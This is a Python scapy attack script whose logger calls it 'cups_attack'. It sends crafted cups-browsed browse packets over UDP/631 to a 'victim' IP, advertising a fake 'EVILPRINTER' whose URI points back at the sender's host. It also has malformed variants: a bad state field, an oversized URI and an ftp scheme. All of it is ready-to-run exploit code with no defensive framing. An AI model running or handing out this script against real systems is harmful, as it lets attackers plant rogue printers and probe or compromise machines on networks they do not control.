#!/usr/bin/env python3
from scapy.all import IP, UDP, Raw, send, wrpcap
import argparse
import logging
import sys

VARIANTS = ["baseline", "bad-state", "oversized-uri", "bad-scheme"]

def build_packet(args, variant):
    victimIP = args.target
    myIP = args.my_ip
    printerURI = f"http://{myIP}:{args.printer_port}/printers/EVILPRINTER"
    variantLines = [f'0 ZZ {printerURI} "{args.location}" "{args.info}"', "http://" + "A" * 1400 + "/printers/EVILPRINTER", f'0 3 ftp://{myIP}:{args.printer_port}/printers/EVILPRINTER "{args.location}" "{args.info}"', f'0 3 {printerURI} "{args.location}" "{args.info}"']
    oversizedLine = f'0 3 {variantLines[1]} "{args.location}" "{args.info}"'
    variantLines[1] = oversizedLine
    for i in range(len(variantLines)):
        variantLines[i] = variantLines[i].encode("utf-8") + b"\n"

    if variant == "bad-state":
        return IP(src=myIP, dst=victimIP) / UDP(sport=631,dport=args.port) / Raw(load=variantLines[0])
    elif variant == "oversized-uri":
        return IP(src=myIP, dst=victimIP) / UDP(sport=631,dport=args.port) / Raw(load=variantLines[1])
    elif variant == "bad-scheme":
        return IP(src=myIP, dst=victimIP) / UDP(sport=631,dport=args.port) / Raw(load=variantLines[2])
    elif variant == "baseline":
        return IP(src=myIP, dst=victimIP) / UDP(sport=631,dport=args.port) / Raw(load=variantLines[3])
    else:
        raise NotImplementedError(f"Variant not implemented: {variant}")

def main():
    p = argparse.ArgumentParser(
        description="Advertise a crafted printer URI to a cups-browsed "
                    "instance over UDP/631."
    )
    p.add_argument("--target", required=True, help="Victim IP")
    p.add_argument("--my-ip", required=True, help="This host's IP")
    p.add_argument("--port", type=int, default=631, help="Destination UDP port (default: 631)")
    p.add_argument("--printer-port", type=int, default=12345,
                    help="Port the advertised fake printer URI claims to serve on")
    p.add_argument("--location", default="Fake Office", help="Browse-line location field")
    p.add_argument("--info", default="Printer", help="Browse-line info field")
    p.add_argument("--variant", choices=VARIANTS + ["all"], default="baseline",
                    help="Which crafted variation to send, or 'all' to send each once")
    p.add_argument("--output", default="attack_capture.pcap",
                    help="Pcap file to write all sent packets to (default: attack_capture.pcap)")
    p.add_argument("--verbose", action="store_true")
    args = p.parse_args()
 
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )
    log = logging.getLogger("cups_attack")
 
    variantsToRun = VARIANTS if args.variant == "all" else [args.variant]
 
    sentPackets = []
    for variant in variantsToRun:
        log.info("Building packet for variant=%s -> target=%s:%d",
                  variant, args.target, args.port)
        try:
            pkt = build_packet(args, variant)
        except NotImplementedError as e:
            log.error("build_packet() not implemented yet: %s", e)
            sys.exit(1)
 
        log.debug("Packet summary: %s", pkt.summary())
        send(pkt, verbose=args.verbose)
        log.info("Sent variant=%s", variant)
 
        sentPackets.append(pkt)
 
    wrpcap(args.output, sentPackets)
    log.info("Wrote %d packet(s) to %s", len(sentPackets), args.output)

 
if __name__ == "__main__":
    main()